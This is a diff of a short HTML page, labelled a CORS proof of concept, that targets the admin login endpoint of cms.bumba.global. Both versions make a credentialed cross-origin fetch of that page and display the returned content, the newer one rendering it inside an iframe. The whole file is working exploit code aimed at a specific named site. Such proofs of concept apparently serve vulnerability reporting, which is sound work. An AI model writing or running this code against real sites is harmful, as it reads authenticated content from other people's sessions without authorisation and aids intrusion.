@@ -1,16 +1,22 @@
 <!doctype html>
 <html>
-<body>
-<h2>Arbitrary-Origin CORS PoC – cms.bumba.global</h2>
-<pre id="out">Loading…</pre>
-
-<script>
-fetch('https://cms.bumba.global/admin/auth/login', {
-  credentials: 'include'
-})
-.then(res => res.text())
-.then(text => document.getElementById('out').textContent = text)
-.catch(err => document.getElementById('out').textContent = err);
-</script>
-</body>
+  <body>
+    <h2>CORS PoC – cms.bumba.global</h2>
+    <iframe id="output" style="width:100%; height:500px; border:1px solid black;"></iframe>
+    <script>
+      fetch('https://cms.bumba.global/admin/auth/login', {
+        credentials: 'include'
+      })
+      .then(res => res.text())
+      .then(html => {
+        // show the HTML inside an iframe
+        const iframe = document.getElementById('output');
+        iframe.srcdoc = html;
+      })
+      .catch(err => {
+        document.body.innerHTML += '<pre>' + err + '</pre>';
+      });
+    </script>
+  </body>
 </html>
+
